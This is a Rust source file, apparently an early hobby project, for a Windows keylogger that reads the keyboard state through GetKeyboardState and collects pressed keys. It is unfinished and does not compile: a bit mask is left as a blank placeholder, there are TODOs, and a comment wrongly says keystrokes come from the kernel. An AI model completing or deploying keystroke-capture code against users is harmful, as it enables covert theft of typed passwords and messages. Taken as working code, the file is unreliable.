use std::fmt::{Debug, Display};
use windows::Win32::Foundation::{GetLastError};
use windows::Win32::UI::Input::KeyboardAndMouse::{GetKeyboardState, ToUnicode};

/*
    Keylogger. Used for retrieving keystrokes from the 
    kernal via Win32 API calls.
*/
pub struct KeyLogger;

impl KeyLogger {
    /*
        "Copies the status of the 256 virtual keys to the specified buffer"
        What are virtual keys?: https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
        
        'windows::GetKeyboardState()' Notes
        ===========================================
        @parameter 'lpKeyState': a 256-byte array that receives the status of the 256 virtual keys
        @return_value: if the function succeeds, the return value is non-zero.
    */
    fn get_keyboard_state() -> Result<[u8; 256], KeyboardReadError> {
        let mut keyboard_state = [0u8; 256];
        unsafe {
            if bool::from(GetKeyboardState(&mut keyboard_state)) {
                return Ok(keyboard_state);
            }
        }

        Err(KeyboardReadError)
    }

    pub fn get_keys() -> Result<Vec<char>, KeyboardReadError> {
        let mut keys: Vec<char> = Vec::new();
        let keyboard_state = KeyLogger::get_keyboard_state()?;

        unsafe {
            for i in 0..256 {
                //TODO: check if higher order bit is set using bit mask
                if keyboard_state[i] & ___ != 0 {  
                    keys.push(char::from(i as u8));  //TODO: 'ToUnicode'
                }
            }
        }
        
        Ok(keys)
    }
}


/* 
    Implementation of 'KeyboardReadError', used when the Win32 API
    throws an error when calling 'GetKeyboardState'
*/
pub struct KeyboardReadError;

impl Debug for KeyboardReadError {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        unsafe {
            //TODO: actually update these lmao
            let error_code = GetLastError();  //Tuple field 0 is the error status code [u32]
            let error_desc = "huh";
            write!(f, "Encountered an error when querying keyboard state from Win32 API: last error code {} ({})", error_code.0, error_desc)
        }
    }
}

impl Display for KeyboardReadError {
    fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
        write!(f, "Error: keyboard state could not be read from system [Win32 API Error]")
    }
}